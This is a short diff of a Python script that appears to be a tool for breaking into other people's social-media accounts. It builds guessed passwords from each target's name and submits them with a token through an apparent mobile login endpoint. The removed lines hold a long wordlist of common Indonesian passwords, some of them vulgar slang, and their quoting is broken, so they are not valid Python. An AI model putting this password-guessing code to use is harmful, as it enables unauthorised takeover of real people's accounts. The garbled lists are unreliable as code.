@@ -561,9 +561,9 @@ def dump(token,nama,ttl):
 					continue
 				else:
 					if(len(str(name.lower()))>=6):
-						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat123',bangsat1234',bangsat12345',bangsat',kontol',kontol123',kontol1234',kontol12345',memek',memek123',memek12345',memek1234',jembut',jembut123',jembut1234',jembut12345',anjing',anjing123',anjing1234',anjing12345',katasandi',bebas123',apaya',cantik',akucantik',ganteng',akuganteng',pesek',pesek123',mancung',mancung123',indonesia',indonesia1945',rahasia',jangankepo',sayang',sayangku',sayangkamu()+'name',masukansandi',doraemon',upinipin',123456789',12345678',1234567',123456',bebasdeh',persib1933',persija1928',persibaya1927',viking',thejak',bonek',bandung',jakarta',surabaya',indonesiaku]
+						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
 					else:
-						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap',bangsat123',bangsat1234',bangsat12345',bangsat',kontol',kontol123',kontol1234',kontol12345',memek',memek123',memek12345',memek1234',jembut',jembut123',jembut1234',jembut12345',anjing',anjing123',anjing1234',anjing12345',katasandi',bebas123',apaya',cantik',akucantik',ganteng',akuganteng',pesek',pesek123',mancung',mancung123',indonesia',indonesia1945',rahasia',jangankepo',sayang',sayangku',sayangkamu()+'name',masukansandi',doraemon',upinipin',123456789',12345678',1234567',123456',bebasdeh',persib1933',persija1928',persibaya1927',viking',thejak',bonek',bandung',jakarta',surabaya',indonesiaku]
+						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
 					if(pas in ('t','T')):
 						kirim.submit(kondisi(token).kondisi_mbasic2,uid,password)
 					else:
